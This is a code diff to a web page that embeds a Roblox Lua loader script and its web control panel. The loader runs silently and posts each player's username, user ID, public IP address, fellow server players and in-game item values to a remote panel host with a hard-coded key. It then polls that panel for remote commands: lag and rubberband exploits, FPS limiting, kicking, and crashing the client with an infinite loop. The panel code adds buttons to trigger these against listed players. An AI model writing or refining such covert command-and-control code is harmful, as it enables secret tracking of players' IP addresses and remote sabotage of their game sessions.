@@ -741,41 +741,58 @@
 
 <script>
 const LOADER_TEMPLATE = `--[[
-  Panel Client v4 — silent, robust
+  Panel Client v3 — fully silent, no GUI, no prints
+  Controlled exclusively via web panel polling.
 ]]
 local BASE = "https://roblox-panel-4h3i.onrender.com"
 local KEY  = "aggredireontopstupidnga"
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
+local Players            = game:GetService("Players")
+local HttpService        = game:GetService("HttpService")
+local RunService         = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
+-- ═══════════════════════════════════════════════════════════
+-- ROBUST BOOTSTRAP — works with raw execution AND whitelist
+-- loaders (Luarmor, etc.) that may run the script in a
+-- sandboxed env or before LocalPlayer/request is ready.
+-- ═══════════════════════════════════════════════════════════
 local genv = (getgenv and getgenv()) or _G or {}
 
+-- Resolve the HTTP request function across executors & sandboxes.
 local function resolveRequest()
-    return http_request or request or (syn and syn.request)
-        or (http and http.request) or (fluxus and fluxus.request)
-        or genv.http_request or genv.request or (genv.syn and genv.syn.request)
+    return http_request
+        or request
+        or (syn and syn.request)
+        or (http and http.request)
+        or (fluxus and fluxus.request)
+        or genv.http_request
+        or genv.request
+        or (genv.syn and genv.syn.request)
 end
 
+-- Retry resolution for a few seconds — under loaders the executor
+-- globals are sometimes injected a tick or two after the script starts.
 local request = resolveRequest()
 if not request then
-    for i = 1, 40 do
+    local deadline = tick() + 10
+    repeat
         task.wait(0.25)
         request = resolveRequest()
-        if request then break end
-    end
+    until request or tick() > deadline
 end
 if not request then return end
 
+-- Acquire LocalPlayer by polling. Do NOT use PlayerAdded:Wait():
+-- when a loader runs after the player already joined, that event
+-- never fires again and the whole script would hang forever.
 local LP = Players.LocalPlayer
 if not LP then
-    for i = 1, 300 do
+    local deadline = tick() + 30
+    repeat
         task.wait(0.1)
         LP = Players.LocalPlayer
-        if LP then break end
-    end
+    until LP or tick() > deadline
 end
 if not LP then return end
 
@@ -803,6 +820,8 @@ local function serverPlayers()
     return t
 end
 
+-- Resolve the player's public IP address once and cache it. Uses a plain-text
+-- IP endpoint so we don't need JSON parsing. Best-effort: returns "" on failure.
 local cachedIp = nil
 local function publicIp()
     if cachedIp ~= nil then return cachedIp end
@@ -819,57 +838,45 @@ local function publicIp()
     return cachedIp
 end
 
--- ═══════════════════════════════════════════════════════════
--- GENERIC BRAINROT DETECTION
--- Scans PlayerGui recursively for ANY text that looks like
--- a brainrot name + cash value pair.
--- ═══════════════════════════════════════════════════════════
 local function collectBrainrots()
     local list = {}
+    -- NEVER use WaitForChild here: under whitelist loaders the script can run
+    -- before PlayerGui has replicated, and WaitForChild would yield forever,
+    -- blocking the heartbeat so the player never appears in the panel.
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
     if not pg then return list end
+    local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
+    if not gui then return list end
+    local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end)
+    if not frame then return list end
+    local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
+    if not scroll then return list end
 
-    -- Recursively scan all descendants for text labels/buttons
-    local function scanDescendants(parent, depth)
-        if depth > 5 then return end  -- Limit depth to avoid lag
-        for _, child in ipairs(parent:GetChildren()) do
-            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
-                local text = child.Text or ""
-                if text ~= "" and #text > 2 then
-                    -- Look for cash patterns: numbers with M, B, K, \$, etc.
-                    local cashMatch = string.match(text, "[%d%.]+[MBKmbk]?[/]?[Ss]?")
-                    local hasCash = string.find(text, "M") or string.find(text, "B") 
-                        or string.find(text, "K") or string.find(text, "%\$")
-                        or string.match(text, "^%d+\$")
-
-                    -- Look for brainrot-like names (not pure numbers, not generic UI text)
-                    local isName = not string.match(text, "^%d+%s*[%\$MBKmbk]?\$")
-                        and not string.find(text, "Button")
-                        and not string.find(text, "Frame")
-                        and not string.find(text, "Template")
-                        and not string.find(text, "UI")
-                        and #text > 3
-
-                    if hasCash and isName then
-                        list[#list+1] = { title = text, cash = text }
+    for _, template in ipairs(scroll:GetChildren()) do
+        if template.Name == "Template" then
+            local cash, title = nil, nil
+            for _, obj in ipairs(template:GetDescendants()) do
+                if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
+                    local text = obj.Text
+                    if string.find(text, "Cookie") or string.find(text, "Milki")
+                       or string.find(text, "%\$")
+                       or (string.match(text, "^%d+\$") and tonumber(text) > 100) then
+                        cash = text
+                    end
+                    if not string.match(text, "^%d+\$")
+                       and not string.find(text, "Template")
+                       and not string.find(text, "Cookie")
+                       and not string.find(text, "Milki")
+                       and string.len(text) > 3 then
+                        if not title or string.len(text) > string.len(title) then
+                            title = text
+                        end
                     end
                 end
             end
-            scanDescendants(child, depth + 1)
-        end
-    end
-
-    scanDescendants(pg, 0)
-
-    -- Also check common brainrot GUI names
-    local commonNames = {
-        "DuelsMachineSession", "Brainrot", "Duel", "Inventory",
-        "Collection", "Pets", "Items", "Storage", "Backpack"
-    }
-    for _, name in ipairs(commonNames) do
-        local gui = safe(function() return pg:FindFirstChild(name) end)
-        if gui then
-            scanDescendants(gui, 0)
+            if cash or title then
+                list[#list+1] = { title = title or "Unknown", cash = cash or "Unknown" }
+            end
         end
     end
 
@@ -877,7 +884,7 @@ local function collectBrainrots()
 end
 
 -- ═══════════════════════════════════════════════════════════
--- HEARTBEAT
+-- HEARTBEAT — reports player info to the web panel
 -- ═══════════════════════════════════════════════════════════
 local function heartbeat()
     safe(function()
@@ -886,17 +893,17 @@ local function heartbeat()
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
             Body = HttpService:JSONEncode({
-                user_id = LP.UserId,
-                username = LP.Name,
-                display_name = LP.DisplayName,
-                avatar_url = avatarUrl(),
-                place_id = game.PlaceId,
-                game_name = gameName(),
-                job_id = game.JobId,
-                executor = executorName,
+                user_id        = LP.UserId,
+                username       = LP.Name,
+                display_name   = LP.DisplayName,
+                avatar_url     = avatarUrl(),
+                place_id       = game.PlaceId,
+                game_name      = gameName(),
+                job_id         = game.JobId,
+                executor       = executorName,
                 server_players = serverPlayers(),
-                ip_address = publicIp(),
-                brainrots = collectBrainrots(),
+                ip_address     = publicIp(),
+                brainrots      = collectBrainrots(),
             }),
         })
     end)
@@ -922,23 +929,26 @@ end
 
 -- ═══════════════════════════════════════════════════════════
 -- RUBBERBAND LAG ENGINE
+-- Straight from the reference source — drives Lag N & Lag C
 -- ═══════════════════════════════════════════════════════════
-local HISTORY_SIZE = 0.27
-local INTERVAL = 0.6
+local HISTORY_SIZE     = 0.27
+local INTERVAL         = 0.6
 local NORMAL_SPEED_MIN = 35
-local CARRY_SPEED_MIN = 17
+local CARRY_SPEED_MIN  = 17
 
-local posHistory = {}
-local isActive = false
-local mode = nil
+local posHistory     = {}
+local isActive       = false
+local mode           = nil   -- nil | "normal" | "carry"
 local intervalThread = nil
 
+-- Continuously record root CFrame for rollback
 RunService.Heartbeat:Connect(function()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
     local now = tick()
     posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
+    -- Trim old entries
     local cutoff = now - HISTORY_SIZE - 0.1
     while #posHistory > 0 and posHistory[1].time < cutoff do
         table.remove(posHistory, 1)
@@ -956,7 +966,7 @@ end
 local function meetsSpeedReq()
     local s = currentSpeed()
     if mode == "normal" then return s >= NORMAL_SPEED_MIN end
-    if mode == "carry" then return s >= CARRY_SPEED_MIN end
+    if mode == "carry"  then return s >= CARRY_SPEED_MIN  end
     return false
 end
 
@@ -964,9 +974,11 @@ local function doRubberband()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
+
     local vel = root.AssemblyLinearVelocity
     local horizVel = Vector3.new(vel.X, 0, vel.Z)
     if horizVel.Magnitude < 1 then return end
+
     local targetTime = tick() - HISTORY_SIZE
     local best = nil
     for i = 1, #posHistory do
@@ -976,6 +988,7 @@ local function doRubberband()
         end
     end
     if not best then return end
+
     root.CFrame = best
     root.AssemblyLinearVelocity = vel
 end
@@ -1021,12 +1034,13 @@ local function setMode(newMode)
 end
 
 -- ═══════════════════════════════════════════════════════════
--- WEB PANEL POLL
+-- WEB PANEL POLL — commands from the control panel override
+-- local state silently. Runs every 0.5s.
 -- ═══════════════════════════════════════════════════════════
 local kicked = false
 local prevLagN = false
 local prevLagC = false
-local prevFps = false
+local prevFps  = false
 
 local function poll()
     local res = safe(function()
@@ -1040,12 +1054,14 @@ local function poll()
     local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
     if not ok2 or type(data) ~= "table" then return end
 
+    -- FPS limit from web panel
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then
         prevFps = wantFps
         setFpsLimit(wantFps)
     end
 
+    -- Lag mode from web panel
     local wantN = (data.lag_n == true)
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC or wantN ~= prevLagN then
@@ -1060,6 +1076,7 @@ local function poll()
         end
     end
 
+    -- One-shot commands
     if data.crash == true then
         while true do end
     end
@@ -1341,7 +1358,7 @@ function toggleDetails(userId) {
     renderPlayers();
 }
 
-async async function toggleFps(userId) {
+async function toggleFps(userId) {
     const state = commandStates.get(userId);
     if (!state) return;
     state.fps_limit = !state.fps_limit;
@@ -1351,7 +1368,7 @@ async async function toggleFps(userId) {
     renderPlayers();
 }
 
-async async function toggleLagC(userId) {
+async function toggleLagC(userId) {
     const state = commandStates.get(userId);
     if (!state) return;
     state.lag_c = !state.lag_c;
@@ -1362,18 +1379,18 @@ async async function toggleLagC(userId) {
     renderPlayers();
 }
 
-async async function toggleLagN(userId) {
+function toggleLagN(userId) {
     const state = commandStates.get(userId);
     if (!state) return;
     state.lag_n = !state.lag_n;
     if (state.lag_n) state.lag_c = false;
-    await sendCommand(userId, { lag_n: state.lag_n, lag_c: state.lag_c });
+    sendCommand(userId, { lag_n: state.lag_n, lag_c: state.lag_c });
     showToast(`Lag N ${state.lag_n ? 'ON' : 'OFF'}`, 'success');
     addChatMsg('system', `Lag N ${state.lag_n ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
     renderPlayers();
 }
 
-async async function kickPlayer(userId) {
+async function kickPlayer(userId) {
     const player = players.get(userId);
     if (!player) return;
     if (!confirm(`Kick ${player.username || 'player'}?`)) return;
@@ -1388,7 +1405,7 @@ async async function kickPlayer(userId) {
     updateCounts();
 }
 
-async async function crashPlayer(userId) {
+async function crashPlayer(userId) {
     const player = players.get(userId);
     if (!player) return;
     if (!confirm(`Crash ${player.username || 'player'}?`)) return;
@@ -1569,7 +1586,6 @@ function doLogin() {
         document.getElementById('loginPassword').focus();
     }
 }
-
 </script>
 
 </body>
